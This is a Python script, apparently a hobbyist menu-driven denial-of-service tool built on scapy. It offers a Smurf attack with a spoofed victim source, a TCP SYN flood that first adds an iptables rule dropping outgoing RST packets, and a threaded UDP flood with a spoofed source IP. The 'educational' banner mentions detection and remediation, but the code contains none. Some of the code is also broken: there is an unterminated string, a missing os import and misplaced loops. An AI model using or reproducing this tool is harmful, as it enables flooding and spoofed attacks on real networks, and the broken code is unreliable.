from scapy.all import *
import sys
import time
from threading import Thread

def menu():
    print '\n## Created by Fr3shnuts'
    time.sleep(1)
    print """
################################################################################
#									       #
#                        *For Educational Purposes Only.*		       #
#									       #
#									       #
#            @@@@@@@@@@    @@@@@@   @@@       @@@@@@@   @@@ @@@  	       #
#            @@@@@@@@@@@  @@@@@@@@  @@@       @@@@@@@@  @@@ @@@                #
#	     @@! @@! @@!  @@!  @@@  @@!       @@!  @@@  @@! !@@  	       #
#            !@! !@! !@!  !@!  @!@  !@!       !@!  @!@  !@! @!!  	       #
#            @!! !@! @!@  @!@!@!@!  @!!       @!@@!@!    !@!@!   	       #
#            !@!  V  !@!  !!!@!!!!  !!!       !!@!!!      @!!!   	       #
#            !!:     !!:  !!:  !!!  !!:       !!:         !!:     	       #
#            :!:     :!:  :!:  !:!   :!       :!:         :!:     	       #
#            :::     ::   ::   :::  !::!: ::   ::          ::    	       #
#              :     :     :   : :  : : :  :    :           :     	       #
#  								   	       #
#									       #
#									       #
#      								               #
#      This module demonstrates   					       #
#   various attacks including Smurf Attack & TCP SYN Flood attacks. References #
#   toward detection and remediation for vulnerabilites are also mentioned.    #
################################################################################

 Menu
 ----

 1. Smurf Attack

 2. TCP SYN Flood Attack

 3. UDP Flood Attack

 a. Check your LAN IP.

###############################################################################
"""
while 1:
    menu()
    userInput = raw_input('Enter #: ')

# Smurf Attack
    if userInput == '1':
        print 'Smurf Attack\n
        print 'Smurf Attack Initiated\n'
        print '----------------------\n'
	
        broadcast = raw_input('\nBroadcast      IP: ')
        victim = raw_input('\nInput target      IP: ')
        
	for ping in range(100):
            a = 0
        while a < 100:
            a = a + 1
            ping = send(IP(dst=broadcast, src=victim) / ICMP(),inter=0.0000001)
            print a

# TCP SYN Flood Attack
    elif userInput == '2':
        print '\n\nTCP Syn Flood Attack:\n'
        print 'Victim queues replies with SYN/ACK.\n'
        print "\nnote - Enabling iptables to drop RST flag"
        time.sleep(1)
        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
        print '\n TCP SYN Flood Initiated.'
        print ' ------------------------'
        dstIP = raw_input('\nTCP Flood Target IP: ')
        dport = int(raw_input('Destination Port: '))
	
        for synAttack in range(100):
            s = 0
            while s < 10:
                s = s + 1
                print '\n', s
                synAttk = IP(dst=dstIP) / TCP(dport=dport,
                sport=RandShort(), flags='S')
                Attk = sr1(synAttk, inter=0.0000001, timeout=2, verbose=1)
	    print "Returning to menu..."
	    time.sleep(1)
            break

# UDP Flood Attack with Threading Support
    elif userInput == '3':
        print '\nUDP Flood Initiated:'
        print '--------------------'
        dstIP = raw_input('\nUDP Flood Target IP: ')
        srcIP = raw_input('\nSpoof            IP: ')
        print '\nUDP Flood Initiated:'
        print '--------------------'
        dport = int(raw_input('Input Port: '))
        def udpAttk(i):
            for udpAttack in range(100):
                u = 0
            while u < 100:
                u = u + 1
                print '\nPackets Sent: ', u
                udpAttack = IP(dst=dstIP, src=srcIP) / UDP(dport=dport,
                sport=RandShort()) / "Hello World"
                Attack = send(udpAttack, inter=0.00000001, verbose=0)
                Attack
        
# Threading: Send 10 simultaneous packets * (range of updAttk function.)
        for i in range(10):
            t = Thread(target=udpAttk, args=(i,))
            t.start()
	if True:
	    t.join()
	    time.sleep(3)
	    print '\nReturning to menu...'

# Check IP status
    elif userInput == 'a':
        print '\nChecking for LAN IP.'
        print '--------------------\n'
	print "Trying: ifconfig"
        os.system('ifconfig')
        print 'Returning to menu...'
        time.sleep(1)
    else:
        print '\nError Exiting'
        sys.exit("\n")

    os.system('iptables -F')
    print '\nOption Finished'
